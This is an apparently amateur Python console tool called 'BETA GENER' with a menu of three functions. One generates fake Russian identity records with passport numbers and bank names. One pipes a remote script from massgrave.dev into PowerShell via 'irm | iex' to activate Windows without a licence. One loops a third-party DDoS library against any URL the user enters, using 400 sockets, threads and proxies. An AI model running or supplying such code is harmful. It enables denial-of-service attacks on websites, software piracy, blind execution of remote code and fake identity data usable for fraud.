import time
import os
os.system('pip install pyfiglet')
os.system('pip install faker')
os.system('pip install progress')
os.system('pip install DDos')
import DDos
import progress.bar as pb
import pyfiglet
import sys
import subprocess
from colorama import init, Fore, Style
from faker import Faker
def progress_bar(timer,text_input):
    bar=pb.ChargingBar(Fore.RED + text_input,max=100)
    for i in range(100):
        bar.next()
        time.sleep(timer)
init(autoreset=True)
Fake_loading_bd=Faker()
Fake_ru_loading_bd=Faker('ru_RU')
colors_for_console_text = [
    Fore.RED, Fore.GREEN, Fore.YELLOW,
    Fore.BLUE, Fore.MAGENTA, Fore.CYAN,
    Fore.WHITE]
def clear ():
    print("\n" * 200)
def inputname():
    global enter1
    entr1='enter telegram option:\n1.Fake Gener\n2.Activation Win\n3.ddos attack\n0.exit\nb.back<\n\n <->'
    enter1=input(Style.BRIGHT + Fore.GREEN + entr1 + Style.RESET_ALL)
    if enter1=='1':
        main()
    elif enter1=='2':
        progress_bar(0.01,'connecting with powershell [wait...]')
        print('\nENTER 1 IN SCRIPT!!!!\n')
        time.sleep(5)
        activation()
    elif enter1=='3':
        progress_bar(0.06,'please wait [...]')
        ddos_attack()
    elif enter1=='0':
        progress_bar(0.06,'please wait [programm is cleaning...]')
        clear()
        exit(0)
    elif enter1=='b':
        back()
    else:
        print('error')
def back():
    clear()
    text_console_name_project = "BETA GENER"
    result_console_name_project=pyfiglet.figlet_format(text_console_name_project, font='banner3-D')
    print(Fore.LIGHTRED_EX + result_console_name_project + Style.RESET_ALL)
    print(Fore.CYAN + '_' * 100)
    inputname()
def Faker_function():
    data={
          'ФИО:' : Fake_ru_loading_bd.name(),
          'Адресс:' : Fake_ru_loading_bd.address(), 
          'Номер телефона:' : Fake_ru_loading_bd.phone_number(), 
          'email:' : Fake_ru_loading_bd.email(), 
          'bank:' : Fake_ru_loading_bd.bank(),
          'Пасспортные даты:' : Fake_ru_loading_bd.passport_dates(),
          'Гендер:' : Fake_ru_loading_bd.passport_gender(),
          'Номер пасспорта:' : Fake_ru_loading_bd.passport_number()
    }
    for i in range(2):
        print('\n')
    for key in data:
        print(key, data[key])
def main():
    progress_bar(0.02,'scanning profile [please wait...]')
    Faker_function()
def ddos_attack():
    sure_q=input('\n Do u sure to DDos?\n1-Yes\n2-No')
    if sure_q=='2':
        clear()
        text_console_name_project = "BETA GENER"
        result_console_name_project=pyfiglet.figlet_format(text_console_name_project, font='banner3-D')
        print(Fore.LIGHTRED_EX + result_console_name_project + Style.RESET_ALL)
        print(Fore.CYAN + '_' * 100)
        inputname()
    elif sure_q=='1':
        progress_bar(0.001,'wait...[.]')
        try:
            import DDos
            print("\nEnter URL")
            url = input("\n")
            while True:
                DDos.DDos(url, sockets = 400, threads = 10, use_proxies = True)   
        except:
            print("something went wrong :(")
            time.sleep(1)
            exit(0)

def activation():
    subprocess.run(['powershell.exe',r'irm https://massgrave.dev/get | iex'])
if __name__ == '__main__':
    text_console_name_project = "BETA GENER"
    result_console_name_project=pyfiglet.figlet_format(text_console_name_project, font='banner3-D')
    print(Fore.LIGHTRED_EX + result_console_name_project + Style.RESET_ALL)
    print(Fore.CYAN + '_' * 100)
    while True:
        inputname()
        
